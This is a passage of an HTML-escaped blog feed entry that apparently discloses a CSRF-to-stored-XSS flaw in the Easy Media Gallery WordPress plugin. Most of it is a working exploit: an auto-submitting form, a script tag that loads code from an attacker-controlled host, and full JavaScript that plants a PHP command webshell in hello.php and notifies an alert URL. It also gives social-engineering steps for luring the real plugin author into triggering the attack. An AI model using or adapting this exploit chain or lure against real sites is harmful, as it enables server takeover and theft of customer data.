            &lt;span class="s1"&gt;&amp;#39;edit.php?post_type=easymediagallery&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Easy Media Gallery Settings&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;easmedia&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nx"&gt;__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Settings&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;easmedia&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;manage_options&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;emg_settings&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;spg_admin&amp;#39;&lt;/span&gt;
    &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;// Lots of other code&lt;/span&gt;
&lt;span class="c1"&gt;// .&lt;/span&gt;
&lt;span class="c1"&gt;// .&lt;/span&gt;
&lt;span class="c1"&gt;// .&lt;/span&gt;
&lt;span class="nx"&gt;add_action&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;admin_menu&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;spg_add_admin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So what does the above code do (wrong)?&lt;/p&gt;
&lt;p&gt;Well first of all, it's a callback function that get's triggered upon
visiting the admin menu, because the hook 'admin_menu' happens to fire
there. So this function is executed whenever a admin user visits the
administration panel. Inside the function, there are checks whether the
user is the admin (with is_admin()) and whether some query parameters
are set to predefined values. Then one layer further into the if
statements, the code verifies whether the parameter 'action' is set to
'save'. If so, the function continues to update the database &lt;em&gt;with
user-supplied options&lt;/em&gt; for the plugin in a foreach loop. The other
if-branch is of no further interest here (although it can also
considered to be a CRSF), because it only allows attackers to reset
options.&lt;/p&gt;
&lt;p&gt;So which options can we update? And why is it dangerous that we may
trick a admin user into updating the options with values set to our
liking?&lt;/p&gt;
&lt;p&gt;To answer the first question, these are the keys to the plugin options
that we can update:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;easymedia_columns
easymedia_alignstyle
easymedia_img_size_limit
easymedia_vid_size
easymedia_disen_autoplv
easymedia_disen_autopl
easymedia_disen_audio_loop
easymedia_audio_vol

easymedia_box_style
easymedia_cur_style
easymedia_mag_icon
easymedia_frm_size
easymedia_frm_col
easymedia_ttl_col
easymedia_brdr_rds
easymedia_thumb_col
easymedia_hover_opcty
easymedia_style_pattern &amp;lt;-- This looks like a good injection point --|
easymedia_disen_bor
easymedia_disen_hovstyle

easymedia_disen_plug
easymedia_disen_rclick
easymedia_disen_databk
easymedia_disen_admnotify
easymedia_disen_dasnews
easymedia_disen_ajax
easymedia_ajax_con_id
easymedia_plugin_core
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And now let's discuss the second question: It is common for developers
to output data originating from the database without sanitizing it. The
belief is probably something like &lt;em&gt;Why should I consider the data in my
own database to be dangerous?&lt;/em&gt;. Because you have to decide at least at
some point when you sanitize your data. The best way to do so is just
before the critical action happens. Escape html attributes before you
print data to the screen. Prevent SQL injections right before crafting
the query. This strategy is called outbound input handling. You can read
more about it on
&lt;a href="http://excess-xss.com/" title="Good article about XSS"&gt;excess-xss.com&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;But the authors of ghozy lab didn't apply neither inbound nor outbound
input handling which lead to potentially malicious code in the database
that is eventually printed to the administration screen by causing a
stored XSS (The output and admin menu generation code is also in
wp-content/plugins/easy-media-gallery/includes/emg-settings.php between
line 275 and 520.&lt;/p&gt;
&lt;p&gt;Again in short and for conclusion: Because there is no way to guarantee
that the action originated from a intentional form submittal by the
administrator (Because there are no security checks with anti
Cross-Site-Request-Forgery barriers such as check_admin_referer() or
check_ajax_referer()), any attacker can set up a page that
incorporates the following form hidden into the site. Note that the form
submits itself in a stealth way, such that a visitor isnt' able to
observer anything suspicious.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;        XSS POC













                document.getElementById(&amp;#39;xss-test&amp;#39;).submit();
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Of course the appropriate values have to be set to match the victims
server credentials. So if we wanted to target the plugin developer, we
would just use the URL in the POST form&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;http://ghozylab.com/wp-admin/index.php?page=settings&amp;amp;post_type=easymediagallery
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and we would host the javascript payload on a hacked server. But wait,
the above POC has the payload&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;pattern-01.png&amp;quot; name=&amp;quot;easymedia_style_pattern&amp;quot; id=&amp;quot;easymedia_style_pattern&amp;quot; /&amp;gt;&lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;http://somehackedserver.com/plugin-loader.js&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;//Nothin here&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now that we can execute arbitrary javascript code in the context of the
admin, what can we possibly do? Well, we can gain remote code execution.
That's the worst outcome of any possible web hack attack, because it
allows us to gain a foothold on the server. Possible scenarios from
there: Steal the databases (money), try to gain root privileges on the
server in order to completely own it. But this is usually kinda hard.&lt;/p&gt;
&lt;p&gt;Anyways, the javascript that is loaded by the stored XSS modifies the
standard plugin hello.php (hello dolly plugin, it's installed by
default) and adds a PHP webshell to it.&lt;/p&gt;
&lt;p&gt;You want to see the code how I managed to to implement it?&lt;/p&gt;
&lt;p&gt;It's rather straightforward and there are probably more elegant ways,
such as using jQuery. Keep in mind that the URL is set to my local
pentest server, except ALERT_URL, this is just made up. In the real
world, you'd substitute the urls to a hacked server that you own and
from which you start and execute your attacks.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;//////////////// Simple script that modifies or substitutes original wordpres plugin code with malicious php code ////////////////&lt;/span&gt;
&lt;span class="c1"&gt;//////////////// It is assumed that the client owns the wordpress admin cookie. Thus this works only via a XSS.   ////////////////&lt;/span&gt;

&lt;span class="c1"&gt;// Enable logging to debug?&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;PLE_LOG&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="c1"&gt;// Without php tags&lt;/span&gt;
&lt;span class="c1"&gt;// HTML meta chars are in character entity references format.&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;PLUGIN_HEADER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;&lt;span class="nx"&gt;\n&lt;/span&gt;&lt;span class="cm"&gt;/*\nPlugin Name: Hello Dolly\nPlugin URI: http://wordpress.org/extend/plugins/hello-dolly/\nDescription: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from Hello, Dolly in the upper right of your admin screen on every page.\nAuthor: Matt Mullenweg\nVersion: 1.6\nAuthor URI: http://ma.tt/\n*/&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;;&lt;/span&gt;
&lt;span class="s1"&gt;var EXPLOIT_CODE = &amp;quot;\nif (isset($_GET[&amp;#39;&lt;/span&gt;&lt;span class="nx"&gt;cmd&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;])&amp;amp;&amp;amp; !empty($_GET[&amp;#39;&lt;/span&gt;&lt;span class="nx"&gt;cmd&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;])){ echo &amp;#39;&amp;#39;;system($_GET[&amp;#39;&lt;/span&gt;&lt;span class="nx"&gt;cmd&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;]);echo &amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;'; /* 7aUwVx80Vz */ }";&lt;br /&gt;
EXPLOIT_CODE = PLUGIN_HEADER + EXPLOIT_CODE;&lt;/p&gt;
&lt;p&gt;// TARGET SETTINGS. Set stuff here.&lt;br /&gt;
var TARGET_WP_PATH =
"http://localhost/\~nikolai/wordpress_pentest/wordpress";&lt;br /&gt;
var PLUGIN_EDITOR_URL = TARGET_WP_PATH +
"/wp-admin/plugin-editor.php";&lt;br /&gt;
var PLUGIN_EDIT_URL = PLUGIN_EDITOR_URL + "?file=hello.php";&lt;br /&gt;
var PLUGIN_TRIGGER_URL = TARGET_WP_PATH +
"/wp-admin/edit.php?post_type=easymediagallery&amp;amp;page=emg_settings";&lt;br /&gt;
var ALERT_URL = 'http://alertattackerhere.com/alert.php';&lt;/p&gt;
&lt;p&gt;function getXMLHttpRequestObject() {&lt;br /&gt;
var ref = null;&lt;br /&gt;
if (window.XMLHttpRequest) { // For recent browsers.&lt;br /&gt;
ref = new XMLHttpRequest();&lt;br /&gt;
} else if (window.ActiveXObject) { // Older IE 6,7,8&lt;br /&gt;
ref = new ActiveXObject("MSXML2.XMLHTTP.3.0");&lt;br /&gt;
}&lt;br /&gt;
return ref;&lt;br /&gt;
}&lt;/p&gt;
&lt;p&gt;/*&lt;br /&gt;
* Removes the HTML char entity references for the HTML meta
characters.&lt;br /&gt;
*/&lt;br /&gt;
function removeCharEntityReferences(data) {&lt;br /&gt;
if ((typeof data) !== "string") {&lt;br /&gt;
throw new TypeError("data needs to be a string");&lt;br /&gt;
return null;&lt;br /&gt;
}&lt;/p&gt;
&lt;p&gt;data = data.replace(/"/g, "\"");&lt;br /&gt;
data = data.replace(/'/g, "'");&lt;br /&gt;
data = data.replace(/\&amp;lt;/g, "\&amp;lt;");&lt;br /&gt;
data = data.replace(/&gt;/g, "&gt;");&lt;br /&gt;
data = data.replace(/&amp;amp;/g, "&amp;amp;");&lt;/p&gt;
&lt;p&gt;return data;&lt;br /&gt;
}&lt;/p&gt;
&lt;p&gt;function js_abort() {&lt;br /&gt;
throw new Error('This is not an error. This is just to abort
javascript.');&lt;br /&gt;
}&lt;/p&gt;
&lt;p&gt;function ple_log(msg) {&lt;br /&gt;
if (PLE_LOG) {&lt;br /&gt;
console.log(msg);&lt;br /&gt;
}&lt;br /&gt;
}&lt;/p&gt;
&lt;p&gt;// Notifies the usage of the exploit.&lt;br /&gt;
function alert_base() {&lt;br /&gt;
// And load page page again to trigger the exploit&lt;br /&gt;
alert = getXMLHttpRequestObject();&lt;br /&gt;
alert.open("GET", ALERT_URL, false);&lt;br /&gt;
alert.send(null);&lt;br /&gt;
}&lt;/p&gt;
&lt;p&gt;var req = getXMLHttpRequestObject();&lt;br /&gt;
//req.responseType = 'document';&lt;br /&gt;
req.open('GET', PLUGIN_EDIT_URL, false);&lt;br /&gt;
req.send(null);&lt;/p&gt;
&lt;p&gt;responseText = req.responseText;&lt;/p&gt;
&lt;p&gt;var res =
/name="_wpnonce"\svalue=\"[a-z0-9]{10}\"/.exec(responseText);&lt;br /&gt;
if (res.length == 1) {&lt;br /&gt;
nonce = /[a-z0-9]{10}/.exec(res[0]);&lt;br /&gt;
} else { // The sites not available. Maybe the plugin is not
installed?!&lt;br /&gt;
nonce = null;&lt;br /&gt;
ple_log('failed to extract a nonce');&lt;br /&gt;
js_abort();&lt;br /&gt;
}&lt;/p&gt;
&lt;p&gt;// Get the plugin code&lt;br /&gt;
// On each wordpress plugin edit site, there's just one textarea tag.&lt;br /&gt;
// The plugin code itself lies between the textarea tags.&lt;br /&gt;
// These regexes aren't really good.&lt;br /&gt;
var startIndex =
responseText.match(/&lt;textarea.*?name="newcontent".*?&gt;/);&lt;br /&gt;
var stopIndex = responseText.match(/\&amp;lt;\/textarea&gt;/);&lt;br /&gt;
pluginCode = responseText.substring(startIndex.index +
startIndex[0].length, stopIndex.index);&lt;br /&gt;
// If there's already a shell&lt;br /&gt;
if (/\/\*\s*7aUwVx80Vz\s\*\//.test(pluginCode)) { /*
7aUwVx80Vz */&lt;br /&gt;
ple_log('shell already uploaded');&lt;br /&gt;
js_abort();&lt;br /&gt;
}&lt;/p&gt;
&lt;p&gt;// Ready to build our POST request&lt;br /&gt;
preq = getXMLHttpRequestObject();&lt;br /&gt;
preq.open("POST", PLUGIN_EDITOR_URL, false);&lt;br /&gt;
preq.setRequestHeader("Content-Type",
"application/x-www-form-urlencoded");&lt;/p&gt;
&lt;p&gt;pd = {&lt;br /&gt;
_wpnonce: nonce,&lt;br /&gt;
_wp_http_referer: PLUGIN_EDIT_URL + "&amp;amp;a=te&amp;amp;scrollto=0",&lt;br /&gt;
a: "",&lt;br /&gt;
scrollto: "192",&lt;br /&gt;
newcontent:
encodeURIComponent(removeCharEntityReferences(EXPLOIT_CODE)),&lt;br /&gt;
action: "update",&lt;br /&gt;
file: "hello.php",&lt;br /&gt;
plugin: "hello.php",&lt;br /&gt;
submit: "Update+File"&lt;br /&gt;
};&lt;br /&gt;
// Build the post data.&lt;br /&gt;
postdata = "";&lt;br /&gt;
for (var key in pd) {&lt;br /&gt;
postdata += (key + "=" + pd[key] + "&amp;amp;");&lt;br /&gt;
}&lt;br /&gt;
postdata = postdata.substr(0, postdata.length - 1); // rstrip the last
&amp;amp;&lt;br /&gt;
preq.send(postdata);&lt;/p&gt;
&lt;p&gt;if (preq.status == 200) {&lt;br /&gt;
var successPattern = /File\sedited\ssuccessfully./;&lt;br /&gt;
if (successPattern.test(preq.responseText)) {&lt;br /&gt;
ple_log('all uploaded');&lt;br /&gt;
alert_base();&lt;br /&gt;
} else {&lt;br /&gt;
ple_log('upload failed');&lt;br /&gt;
js_abort();&lt;br /&gt;
}&lt;br /&gt;
} else {&lt;br /&gt;
ple_log('Some error occured: ' + preq.statusText);&lt;br /&gt;
js_abort();&lt;br /&gt;
}&lt;/p&gt;
&lt;h3&gt;How dangrous is the vulnerability?&lt;/h3&gt;
&lt;p&gt;I'd say such security holes are &lt;strong&gt;very dangerous&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Of course you need a minimal social engineering effort in order to make
the victim visit your attacking site that incorporates the auto
submittable form which in turn triggers the XSS. Additionaly, you need
to ensure that the victim possesses valid admin cookies of his wordpress
site. But there are ways to increase the likelihood that he has a valid
admin session when you attack him (Or better: When he visits the
attacking site).&lt;/p&gt;
&lt;p&gt;For example here are some ways to deliver the attack:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Post a comment on the target site. Then place a URL of your
    attacking site within the comment. The victim admin will only see
    the comment when he is logged in to approve or deny the publishing
    of your comment. Hence he &lt;em&gt;must&lt;/em&gt; have a valid admin session. So when
    he clicks on the link: Boom, the server is completely fucked up!&lt;/li&gt;
&lt;li&gt;Attack the author of the plugin. It is very likely that they have
    the most recent version (And thus the vulnerability) installed on
    the server. Write a email and feign a little issue with the
    &lt;em&gt;elsewhere very cool and nice plugin&lt;/em&gt;. Explain that your purchased
    the PRO version of the plugin and that you experience issues with
    some functionaliy in the administration form (This forces the plugin
    author to falsify whether he has the same issues on his site, which
    tricks him into loggin in and obtaining the necessary admin cookie).
    Then add a detailed and plausible error explanation on your
    attacking site, where the trigger is hidden (See POC above). The
    victim visits and boom you own the server and all the financial
    credits of all purchases made by the customers (which are most
    likely on the same site as the plugin publishers). If you own the
    plugin authors website and you managed to exploit it in a stealthy
    way, you can continue spread male-ware from there.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The only drawback I currently experienced in my tests, is that the
attacking form will make the victim visit his own admin menu. There is
no way to load the page hidden and execute the javascript without
changing the current screen of the browser to the admin form of the
victim, because in most cases wordpress (or sometimes the webserver)
sends automatically the header&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;X-Frame-Options SAMEORIGIN;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;which &lt;a href="https://developer.mozilla.org/en-US/docs/HTTP/X-Frame-Options" title="x-frame-header prevents stealth xss"&gt;cripples all attempts to load the dom in a hidden
iframe&lt;/a&gt;.
Thus, I cannot see a proper way to attack a victim without making him to
notice that something &lt;em&gt;odd&lt;/em&gt; is going on. The plugin author would begin
to ask himself: Why the hell get I redirected to my own administration
menu of my blog when I just clicked on the link given by this clueless
customer that so desperately needs help with his little issue? Is there
something fishy? Am I being tricked?&lt;/p&gt;
&lt;p&gt;But usually, then it's to late and I already have shell access to the
server.&lt;/p&gt;
&lt;p&gt;So there needs to be done further research. In particular: do you have a
idea to execute the attack more stealthy, such that the POST request
that causes the XSS doesn't inevitably send the victim to the sink
source of the tainted data?&lt;/p&gt;
&lt;p&gt;Please send me a comment if you have a idea!&lt;/p&gt;
&lt;p&gt;Cheers&lt;/p&gt;</summary><category term="easy-media-gallery"></category><category term="exploit"></category><category term="stored"></category><category term="vulnerablity"></category><category term="websecurity"></category><category term="XSS"></category></entry></feed>